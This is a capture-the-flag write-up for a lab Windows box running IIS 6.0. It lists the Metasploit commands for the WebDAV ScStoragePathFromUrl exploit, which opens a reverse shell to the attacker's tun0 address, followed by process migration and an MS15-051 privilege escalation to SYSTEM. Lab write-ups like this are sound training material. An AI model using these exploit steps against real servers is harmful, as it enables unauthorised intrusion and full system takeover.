- As for granny this box has iis 6.0.

### Webdav

- Let's use the same metasploit module we used in granny `use exploit/windows/iis/iis_webdav_scstoragepathfromurl`
- `set RHOSTS 10.10.10.14`
- `set LHOST tun0` and `run`
- We get a shell let's migrate as getuid returns an access denied
- `ps` we choose a process running as `NT AUTHORITY\NETWORK SERVICE` and then we use `migrate` with pid `migrate 1608`
- getuid now returns something to us

## Privesc

- Let's try local exploit suggester first `run multi/recon/local_exploit_suggester`
- As for granny we do not get any result.
- Let's check systeminfo and run wes on it

- We get also a lot of results with wes
- Let's try CVE-2014-4076 (MS14-070)
- Here as well our shell dies
- It does not seem to be vulnerable to CVE-2014-4113 according to wes
- Let's try CVE-2015-1701 (MS15-051)
- `use exploit/windows/local/ms15_051_client_copy_image`
- `set SESSION 3`
- `set LHOST tun0`
- `set LPORT 4445`
- `run`
- We get a system shell and we can grab the flags
